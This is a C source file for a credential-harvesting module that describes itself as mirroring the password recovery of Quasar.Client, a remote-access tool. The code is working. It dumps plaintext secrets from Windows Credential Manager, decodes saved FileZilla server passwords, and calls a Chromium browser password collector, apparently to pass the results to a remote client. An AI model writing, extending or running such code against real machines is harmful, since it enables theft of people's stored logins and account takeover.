/**
 * remote_passwords.c
 * Password recovery - mirrors C# Quasar.Client Recovery.
 * Sources: Windows Credential Manager, FileZilla, Chromium browsers (Chrome, Edge, etc.).
 */
#include "pch.h"
#include "remote_passwords.h"
#include "remote_log.h"
#include <wincred.h>
#include <ShlObj.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

/* Helper: add account if we have space. Returns 1 if added, 0 if full. */
static int add_account(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts,
    const char* username, const char* password, const char* url, const char* application) {
    if (!accounts || !n || *n >= max_accounts) return 0;
    remote_recovered_account_t* a = &accounts[*n];
    memset(a, 0, sizeof(*a));
    if (username) strncpy_s(a->username, sizeof(a->username), username, _TRUNCATE);
    if (password) strncpy_s(a->password, sizeof(a->password), password, _TRUNCATE);
    if (url) strncpy_s(a->url, sizeof(a->url), url, _TRUNCATE);
    if (application) strncpy_s(a->application, sizeof(a->application), application, _TRUNCATE);
    if (a->username[0] || a->url[0]) {
        (*n)++;
        return 1;
    }
    return 0;
}

/* Convert UTF-16 to UTF-8. */
static unsigned int wide_to_utf8(const WCHAR* wide, unsigned int wide_len, char* out, unsigned int out_size) {
    if (!out || out_size == 0) return 0;
    out[0] = '\0';
    if (!wide || wide_len == 0) return 0;
    int n = WideCharToMultiByte(CP_UTF8, 0, wide, (int)wide_len, out, (int)out_size - 1, NULL, NULL);
    if (n <= 0) return 0;
    out[n] = '\0';
    return (unsigned int)n;
}

static void blob_to_string(const BYTE* blob, DWORD blob_size, char* out, unsigned int out_size) {
    if (!out || out_size == 0) return;
    out[0] = '\0';
    if (!blob || blob_size == 0 || blob_size > 0x7FFF) return;
    unsigned int i = 0;
    for (DWORD j = 0; j < blob_size && i < out_size - 1; j++) {
        char c = (char)blob[j];
        out[i++] = (c == '\0') ? ' ' : c;
    }
    out[i] = '\0';
}

/* ---- Windows Credential Manager ---- */
static void collect_credential_manager(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts) {
    DWORD count = 0;
    PCREDENTIALW* creds = NULL;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) {
        if (GetLastError() != 1168u) remote_log("[passwords] CredEnumerate failed: %lu", GetLastError());
        return;
    }
    for (DWORD i = 0; i < count && *n < max_accounts; i++) {
        PCREDENTIALW c = creds[i];
        if (!c || (c->Type != CRED_TYPE_GENERIC && c->Type != CRED_TYPE_DOMAIN_PASSWORD)) continue;
        char url[REMOTE_ACCOUNT_STR_LEN], user[REMOTE_ACCOUNT_STR_LEN], pass[REMOTE_ACCOUNT_STR_LEN];
        wide_to_utf8(c->TargetName, (unsigned int)wcslen(c->TargetName), url, sizeof(url));
        wide_to_utf8(c->UserName, (unsigned int)wcslen(c->UserName), user, sizeof(user));
        blob_to_string(c->CredentialBlob, c->CredentialBlobSize, pass, sizeof(pass));
        add_account(accounts, n, max_accounts, user, pass, url, "Windows Credential Manager");
    }
    CredFree(creds);
}

/* ---- Base64 decode (for FileZilla) ---- */
static int base64_decode(const char* in, unsigned int in_len, unsigned char* out, unsigned int out_size, unsigned int* out_len) {
    static const signed char tbl[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    };
    unsigned int o = 0;
    unsigned int v = 0, bits = 0;
    for (unsigned int i = 0; i < in_len && o < out_size; i++) {
        int b = tbl[(unsigned char)in[i]];
        if (b < 0) { if (in[i] == '=') break; continue; }
        v = (v << 6) | (unsigned int)b;
        bits += 6;
        if (bits >= 8) { out[o++] = (unsigned char)(v >> (bits - 8)); bits -= 8; }
    }
    *out_len = o;
    return 1;
}

/* Extract content between <Tag> and </Tag>. Returns 1 if found and copied to out. */
static int extract_xml_tag(const char* buf, unsigned int buf_len, const char* tag, char* out, unsigned int out_size) {
    char open[64], close[64];
    _snprintf_s(open, sizeof(open), _TRUNCATE, "<%s>", tag);
    _snprintf_s(close, sizeof(close), _TRUNCATE, "</%s>", tag);
    const char* p = strstr(buf, open);
    if (!p) return 0;
    p += strlen(open);
    const char* q = strstr(p, close);
    if (!q || (unsigned int)(q - p) >= out_size) return 0;
    unsigned int len = (unsigned int)(q - p);
    memcpy(out, p, len);
    out[len] = '\0';
    return 1;
}

/* Simple XML Server parser: find <Server> blocks and extract Host, Port, User, Pass. */
static void parse_filezilla_servers(const char* path, const char* app_name,
    remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts) {
    FILE* f = NULL;
    if (fopen_s(&f, path, "rb") != 0 || !f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > 1024 * 1024) { fclose(f); return; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, (unsigned int)sz + 1);
    if (!buf) { fclose(f); return; }
    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[rd] = '\0';

    const char* p = buf;
    while (*p && *n < max_accounts) {
        const char* start = strstr(p, "<Server>");
        if (!start) break;
        const char* end = strstr(start, "</Server>");
        if (!end) break;
        unsigned int blk_len = (unsigned int)(end - start + 9);
        char host[512] = {0}, port[64] = {0}, user[512] = {0}, pass_enc[1024] = {0};
        extract_xml_tag(start, blk_len, "Host", host, sizeof(host));
        extract_xml_tag(start, blk_len, "Port", port, sizeof(port));
        extract_xml_tag(start, blk_len, "User", user, sizeof(user));
        extract_xml_tag(start, blk_len, "Pass", pass_enc, sizeof(pass_enc));

        if (host[0]) {
            char url[600];
            if (port[0]) _snprintf_s(url, sizeof(url), _TRUNCATE, "%s:%s", host, port);
            else strncpy_s(url, sizeof(url), host, _TRUNCATE);
            char pass[1024] = {0};
            unsigned int pass_len = 0;
            unsigned char dec[768];
            if (base64_decode(pass_enc, (unsigned int)strlen(pass_enc), dec, sizeof(dec), &pass_len)) {
                if (pass_len < sizeof(pass)) { memcpy(pass, dec, pass_len); pass[pass_len] = '\0'; }
            } else
                strncpy_s(pass, sizeof(pass), pass_enc, _TRUNCATE);
            add_account(accounts, n, max_accounts, user, pass, url, app_name);
        }
        p = end + 9;
    }
    HeapFree(GetProcessHeap(), 0, buf);
}

/* ---- FileZilla ---- */
static void collect_filezilla(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts) {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        char fp[MAX_PATH];
        _snprintf_s(fp, sizeof(fp), _TRUNCATE, "%s\\FileZilla\\recentservers.xml", path);
        parse_filezilla_servers(fp, "FileZilla", accounts, n, max_accounts);
        _snprintf_s(fp, sizeof(fp), _TRUNCATE, "%s\\FileZilla\\sitemanager.xml", path);
        parse_filezilla_servers(fp, "FileZilla", accounts, n, max_accounts);
    }
}

/* ---- Chromium (Chrome, Edge, Brave, Opera) - requires remote_passwords_chromium ---- */
extern void remote_passwords_collect_chromium(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts);

unsigned int remote_passwords_collect(remote_recovered_account_t* accounts, unsigned int max_accounts) {
    if (!accounts || max_accounts == 0) return 0;
    unsigned int n = 0;
    collect_credential_manager(accounts, &n, max_accounts);
    collect_filezilla(accounts, &n, max_accounts);
    remote_passwords_collect_chromium(accounts, &n, max_accounts);
    remote_log("[passwords] collected %u credentials", n);
    return n;
}
